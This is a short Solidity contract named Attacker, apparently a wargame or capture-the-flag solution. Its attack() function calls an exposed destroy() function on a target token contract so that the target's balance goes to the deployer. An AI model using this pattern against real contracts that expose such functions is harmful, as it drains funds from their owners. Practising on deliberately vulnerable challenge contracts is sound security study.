// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface ISimpleToken {
  function destroy(address payable _to) external;
}

contract Attacker {
    ISimpleToken immutable token;
    address payable attacker; 
    constructor(address _token) {
        token = ISimpleToken(_token);
        attacker = payable(msg.sender);
    }

    function attack() external {
        token.destroy(attacker);
    }
}